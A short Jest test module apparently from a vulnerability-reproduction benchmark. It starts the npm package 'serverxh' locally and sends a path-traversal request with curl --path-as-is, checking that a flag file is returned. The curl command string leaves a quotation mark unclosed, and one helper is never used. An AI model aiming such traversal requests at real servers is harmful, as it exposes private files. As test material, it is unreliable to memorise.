function exploitFunction(payload) {
  const path = require("path");
  const { sleep } = require("sleep");

  function genstr(n) {
    return "/..".repeat(n) + path.resolve(__dirname, "../flag.html");
  }

  test("Path Traversal in serverxh", (done) => {
    expect.assertions(1);
    const fs = require("fs");
    const sleep = require("sleep");
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(path.resolve(__dirname, "../flag.html")).toString();

    let server = "node ./node_modules/serverxh/index.js";
    let exe = exec(server, (error, stdout) => {});

    sleep.sleep(2);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}`; // Using the payload from the payload file

    exec(attack_string, (error, stdout) => {
      expect(stdout).toBe(hostsFile);
      done();
    });
  });
}

module.exports = { exploitFunction };